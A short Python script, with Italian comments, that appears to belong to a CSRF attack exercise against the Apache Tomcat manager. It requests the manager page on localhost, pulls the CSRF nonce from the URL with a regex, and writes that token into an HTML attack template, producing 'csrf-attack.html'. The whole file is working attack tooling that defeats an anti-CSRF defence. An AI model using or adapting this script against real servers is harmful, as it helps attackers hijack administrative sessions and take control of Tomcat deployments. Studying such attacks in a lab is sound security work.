import requests
import re

TEMPLATE_FILE = "template-csrf-attack.html"
OUTPUT_FILE = "csrf-attack.html"

def get_csrf_token():
    url = "http://localhost:8080/manager/"
    response = requests.get(url)
    match = re.search(r'org\.apache\.catalina\.filters\.CSRF_NONCE=([A-F0-9]+)', response.url)
    csrf_token = None
    if match:
        csrf_token = match.group(1)  # Ottiene il token dalla regex
    else:
        print("CSRF Token non trovato nell'URL.")
        exit(1)


    with open(TEMPLATE_FILE, 'r') as file:
        html_content = file.read()

    # Sostituisci il valore del token CSRF and SESSION_ID
    updated_content = html_content.replace("TOKEN_CSRF", csrf_token)


    # Scrivi il contenuto aggiornato nel file
    with open(OUTPUT_FILE, 'w') as file:
        file.write(updated_content)






if __name__ == "__main__":
    get_csrf_token()